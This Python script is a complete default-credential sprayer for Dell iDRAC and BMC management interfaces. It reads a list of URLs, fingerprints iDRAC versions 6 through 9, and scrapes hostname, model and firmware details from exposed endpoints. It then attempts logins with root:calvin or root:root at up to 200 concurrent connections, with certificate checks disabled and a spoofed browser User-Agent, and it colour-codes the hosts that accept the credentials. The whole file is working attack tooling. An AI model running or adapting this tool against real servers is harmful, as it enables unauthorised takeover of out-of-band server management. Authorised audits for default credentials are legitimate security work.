import argparse
import asyncio
import ssl
import httpx
from urllib.parse import urlparse
from xml.etree import ElementTree
import sys
# disable certificate warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# disable beautiful soup warnings
import warnings
warnings.filterwarnings("ignore", category=UserWarning, module='bs4')

# https://gist.github.com/fnky/458719343aabd01cfb17a3a4f7296797
class Colour:
    BOLDBLUE = '\033[0;1;34m'
    YELLOW = '\033[0;33m'
    GREEN = '\033[0;32m'
    RED = '\033[0;31m'
    END = '\033[0m'

# Dell Remote Management Controller (Baseboard Management Controller)= root:root
# iDRAC= root:calvin
async def httpx_get(client, limit, url, timeout=30):
    async with limit:
        url = url.rstrip()
        orig_url = urlparse(url)
        headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0'}
        resp = None
        try:
            # request is sent and await causes control to be given back to event loop which gives control to other coroutines if waiting
            # this differs from other languages as await doesn't give control back to parent function if it is not the final await rather it may give it to other coroutines
            resp = await client.get(url, headers=headers, timeout=timeout, follow_redirects=True) 
        except httpx.RemoteProtocolError as e:
            # specific bug in httpx and follow_redirects on tlsv1.0 sites
            if str(e) == "no response line received":
                return "Error: %s url:%s (Try running through a proxy)" % (str(e),url)
        except Exception as e:
            return "Error: %s url:%s" % (str(e),url)

        if resp == None:
            return "Error: no response object url:%s" % url
        
        version = "unknown"
        auth_result = "n/a"
        hostname = "n/a"
        firmware_version = "n/a"
        server_model = "n/a"
        # string present in iDRAC 6-8 (same auth request)
        if 'var isSSOenabled' in resp.text:
            # string present in iDRAC 7/8
            if 'when the iDRAC' in resp.text:
                version = "iDRAC 7/8" # 7 and 8 are distinguishable but that would require an extra http request
                idrac_props_url = orig_url._replace(path='/session?aimGetProp=hostname,gui_str_title_bar,OEMHostName,fwVersion,sysDesc').geturl()
                try:
                    resp = await client.get(idrac_props_url, headers=headers, timeout=timeout, follow_redirects=False) 
                    properties = resp.json()["aimGetProp"]
                    hostname = properties["hostname"]
                    firmware_version = properties["fwVersion"]
                    server_model = properties["sysDesc"]
                    # oem_hostname = properties["OEMHostName"]
                except Exception as e:
                    pass
            else:
                version = "iDRAC 6"
            
            # iDRAC 6,7,8 authentication
            idrac6_7_8_login_url = orig_url._replace(path='/data/login').geturl()
            data = 'user=root&password=calvin'
            try:
                resp = await client.post(idrac6_7_8_login_url, headers=headers, data=data, timeout=timeout, follow_redirects=False) 
                auth_result = ElementTree.fromstring(resp.content).find("./authResult").text
            except Exception as e:
                return "Error: %s url:%s" % (str(e),idrac6_7_8_login_url)

        # string present in iDRAC 9
        elif 'idrac-start-screen' in resp.text:
            version = "iDRAC 9"

            idrac_props_url = orig_url._replace(path='/sysmgmt/2015/bmc/info').geturl()
            try:
                # also returns oidc provider, server generation, SSO enabled, build version, lockdown status, ect
                resp = await client.get(idrac_props_url, headers=headers, timeout=timeout, follow_redirects=False) 
                properties = resp.json()["Attributes"]
                hostname = properties["iDRACName"]
                firmware_version = properties["FwVer"]
                server_model = properties["SystemModelName"]
                # oem_hostname = properties["OEMHostName"]
            except Exception as e:
                pass

            # iDRAC9 authentication
            idrac9_login_url = orig_url._replace(path='/sysmgmt/2015/bmc/session').geturl()
            auth_headers = {'user':'"root"', 'password':'"calvin"'}
            auth_headers.update(headers)
            try:
                resp = await client.post(idrac9_login_url, headers=auth_headers, timeout=timeout, follow_redirects=False) 
                auth_result = str(resp.json()["authResult"])
            except Exception as e:
                return "Error: %s url:%s" % (str(e),idrac9_login_url)

        # string present in Dell BMC
        elif 'Dell Remote Management Controller' in resp.text:
            version = "BMC Web Interface"
            # same authentication handshake as iDRAC 6,7,8
            idrac6_7_8_login_url = orig_url._replace(path='/data/login').geturl()
            data = 'user=root&password=root'
            try:
                resp = await client.post(idrac6_7_8_login_url, headers=headers, data=data, timeout=timeout, follow_redirects=False) 
                auth_result = ElementTree.fromstring(resp.content).find("./authResult").text
            except Exception as e:
                return "Error: %s url:%s" % (str(e),idrac6_7_8_login_url)
        
        else:
            return "Error: Host is not iDRAC or Dell BMC url:%s" % (url)
        
        # set status printing colour
        print_colour = ""
        if auth_result == "0":
            print_colour = f"{Colour.GREEN}"
        # auth is successful but user has to change their password
        elif auth_result == "7":
            print_colour = f"{Colour.GREEN}"
        # auth is unsuccessful
        elif auth_result == "1":
            print_colour = f"{Colour.RED}"
        else:
            print_colour = f"{Colour.YELLOW}"
        
        url_host = orig_url._replace(path='/').geturl()
        return f"%surl=%s, version=%s, name=%s, model=%s, fw=%s, authResult=%s{Colour.END}" % (print_colour,url_host,version,hostname,server_model,firmware_version,auth_result)


async def fetch_pages(urls):
    limit = asyncio.Semaphore(200) # max concurrent connections
    ssl_context = httpx.create_ssl_context()
    # ignore Certificate validation
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE
    # set minimum TLS version to TLSv1
    ssl_context.minimum_version = ssl.TLSVersion.TLSv1

    async with httpx.AsyncClient(verify=ssl_context) as client:
        coros = []
        for url in urls:
            coros.append(asyncio.create_task(httpx_get(client, limit, url)))

        # the first coro will be returned by the as_completed generator if none are completed yet
        for coro in asyncio.as_completed(coros):
            # `await coro` only promises the return of coro but during resolution of the awaits inside coro, control is given to the event loop which will execute other coros/tasks in the meantime if they are waiting. 
            # !only coro is required to return but other coros may finish before!
            resp = await coro 
            print(resp)

def main():
    parser = argparse.ArgumentParser(add_help=True, description='Spray iDRAC with default credentials (root:calvin)')
    parser.add_argument('file', metavar='file', help='file containing urls to spray')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    asyncio.run(fetch_pages(open(options.file).readlines()))

if __name__ == "__main__":
    main()
